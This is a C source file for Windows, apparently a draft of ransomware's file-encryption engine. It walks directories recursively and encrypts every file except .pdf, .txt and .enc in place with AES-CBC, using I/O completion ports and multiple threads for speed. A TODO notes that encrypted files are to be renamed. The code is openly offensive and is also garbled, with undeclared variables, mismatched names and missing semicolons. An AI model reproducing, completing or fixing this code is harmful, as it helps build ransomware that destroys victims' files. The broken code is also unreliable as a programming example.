#include <IoAPI.h>
#include <fileapi.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <malloc.h>
#include <processthreadsapi.h>
#include <fcrypt.h>
char *exclude[]={".pdf",".txt",".enc"};
HANDLE CompletionPort;

int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}
void recurse(char *folder)
{
char fullpath[256];
      memset(fullpath,0,sizeof(fullpath));
int i = strlen(folder);
      memcpy(fullpath,folder,i);
WIN32_FIND_DATA data;
HANDLE find_file;
HANDLE thread;
      findfile = FindFirstFileA(fullpath,&data);
      if(findfile != INVALID_HANDLE_VALUE)
      {
        do{
             if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
              {
                
                PathCombine(fullpath, lpFolder, data.cFileName);
               thread =  CreateThread(0,0,recurse,fullpath,0,0);
              }
              else
             {
                   if(should_crypt(data.cFileName)
                   {
                         
                      associate_file(data.cFileName);
                         
                   }
             }
          } while(FindNextFile(find_file, &data));
        FindClose(find_file);
      }
 
exit(0);

}
void associate_file(char *filename)
{
HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
      overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
      memset(new_ovl,0,sizeof(overlapped_enc));
      ovl->file = file;
      LARGE_INTEGER li;
      GetFileSizeEx(file,&li);
      ovl->file_size = li.QuadPart;
      if(new_ovl->file_size < BLOCK_SIZE)
      {
new_ovl->operation = HANDLE_EOF;
      }
      else
      {
new_ovl->operation = READ;
      }
      if( CreateIoCompletionPort(CompletionPort,file,0,0) == NULL)
      {
return 1;
      }
      if(!PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED *)new_ovl))
      {
return 1;    
      }
return 0;;


}
void block_read(overlapped_enc *ovl,struct AES_ctx* ctx )
{
LARGE_INTEGER li;
li.QuadPart = (ovl->current_block * BLOCK_SIZE);
ovl->overlapped.Offset = li.LowPart;
ovl->overlapped.OffsetHigh = li.HighPart;
      BOOL res = ReadFile(ovl->file,ovl->inpbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
      AES_CBC_encrypt_buffer(ctx,ovl->impbuff,BLOCK_SIZE);
ovl->operation = WRITE;
      PostQueuedCompletionStatus(CompletionPort,0,0, (LPOVERLAPPED)ovl);
      return ;
}
void block_write(overlapped_enc *ovl)
{     
    memcpy(ovl->inpbuff,ovl->outbuff,BLOCK_SIZE);
    BOOL res = WriteFile(ovl->file,ovl->outbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->current_block +=1;
    ULONGLONG next_offset = (ovl->current_block * BLOCK_SIZE) + BLOCK_SIZE ;
      
if(next_offset >= ovl->file_size)
{
ovl->operation = HANDLE_EOF;
}
else
{
ovl->operation = READ;
}
  
  PostQueuedCompletionStatus(CompletionPort, 0, 0, (LPOVERLAPPED)ovl);
 return ;



}
void handle_eof(overlapped_enc *ovl,struct AES_ctx* ctx )
{
memset(ovl->impbuff,0,BLOCK_SIZE);
BOOL res = ReadFile(ovl->file,ovl->impbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
AES_CBC_encrypt_buffer(ctx,ovl->impbuff,BLOCK_SIZE);
BOOL res = WriteFile(ovl->file,ovl->impbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->operation = CLOSE_IO;
  PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED)ovl);
      return;
}
void close_io(overlapped_enc *ovl)
{
CancelIo(ovl->file);
CloseFile(ovl->file);

      //* TODO change file name
      free(ovl);
      return;


}
void crypt(struct AES_ctx* ctx )
{
BOOL result;
DWORD CompletionKey;
overlapped_enc *OverLapped;
LONGLONG offset;
while(1)
  {
result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,(LPOVERLAPPED*)&OverLapped,5000);
switch(OverLapped->operation)
  {
    case WRITE:
 block_write(OverLapped);   
    break;
        
    case READ:
block_read(OverLapped,ctx);
    break;
        
    case HANDLE_EOF:
handle_eof(OverLapped,ctx);
    break;

    case CLOSE_IO:
close_io(OverLapped);
    break;
  }
  }
}
/*void crypt_file_fast(char *key,char *file)
{






}
*/
void crypt_dir(char *key,char *dir)
{
SYSTEM_INFO sys_info;
GetSystemInfo(&sys_info);
struct AES_ctx ctx;
AES_init_ctx(ctx,key);
DWORD threads;
threads = 2 * sys_info.dwNumberOfProcessors;
HANDLE thread;
  CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
    if(CompletionPort)
  {
do
  {
thread = CreateThread(0,0,crypt,ctx,0,0)

threads--
  }
while(threads)
  }
recurse(dir);
}
